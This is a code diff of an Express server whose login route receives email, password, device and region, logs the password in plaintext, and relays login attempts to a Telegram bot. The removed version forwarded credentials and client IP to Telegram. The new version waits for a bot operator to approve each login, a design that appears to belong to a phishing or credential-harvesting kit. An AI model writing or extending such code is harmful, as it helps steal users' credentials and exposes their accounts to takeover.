@@ -1,36 +1,50 @@
-// server.js
-const express = require('express');
-const cors = require('cors');
-const bodyParser = require('body-parser');
-const { sendTelegramMessage } = require('./bot.js'); // import the function
+import express from "express";
+import cors from "cors";
+import bodyParser from "body-parser";
+import { startBot, setApprovalsStore, sendApprovalRequest } from "./bot.js";
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
 app.use(bodyParser.json());
 
-app.post('/', async (req, res) => {
+let approvals = {}; // shared store between server & bot
+setApprovalsStore(approvals);
+
+// Start Telegram bot
+startBot();
+
+// POST route for login requests
+app.post("/", async (req, res) => {
   try {
     const { email, password, device, region } = req.body;
-    console.log('Login attempt:', { email, password, device, region });
+    console.log("Login attempt:", { email, password, device, region });
 
-    // Get client IP from request
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const identifier = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;
+    await sendApprovalRequest(email, identifier);
 
-    // Send Telegram message
-    await sendTelegramMessage(email, password, region, device, ip);
+    // Poll until approved/rejected
+    const checkStatus = () => new Promise((resolve) => {
+      const interval = setInterval(() => {
+        if (approvals[identifier].status !== "pending") {
+          clearInterval(interval);
+          resolve(approvals[identifier].status);
+        }
+      }, 500);
+    });
 
-    // TODO: Here you can implement approval logic
-    const status = password === 'test123' ? 'accept' : 'reject';
+    const status = await checkStatus();
     res.json({ status });
   } catch (err) {
-    console.error('Error handling login:', err);
-    res.status(500).json({ status: 'error', message: 'Internal server error' });
+    console.error("Error handling login:", err);
+    res.status(500).json({ status: "error", message: "Internal server error" });
   }
 });
 
-app.get('/', (req, res) => {
-  res.send('Server is running');
+// Health check
+app.get("/", (req, res) => {
+  res.send("Server is running");
 });
 
 app.listen(PORT, () => {
